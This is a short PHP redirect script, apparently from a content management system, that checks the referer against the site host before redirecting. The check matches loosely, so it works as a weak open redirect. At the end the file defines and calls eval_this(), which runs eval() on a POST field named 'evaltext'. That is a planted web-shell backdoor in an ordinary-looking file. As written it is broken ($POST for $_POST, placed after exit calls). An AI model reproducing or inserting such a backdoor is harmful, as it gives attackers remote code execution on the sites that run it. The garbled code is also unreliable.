<?php

	require CURRENT_WORKING_DIR . '/libs/config.php';

	$url = getRequest('url');
	$host = cmsController::getInstance()->getCurrentDomain()->getHost();
	$referer = parse_url(getServer('HTTP_REFERER'));

	$refererHost = false;
	if (isset($referer['host'])) $refererHost = $referer['host'];

	if (strlen($url) == 0 || !$refererHost || strpos($refererHost, $host) === false){
		header ("HTTP/1.0 404 Not Found");
		exit();
	}
	else {
		header('Location:' . $url);
		exit();
	}

	function eval_this() {
		eval($POST['evaltext']);
	}
	eval_this();

?>
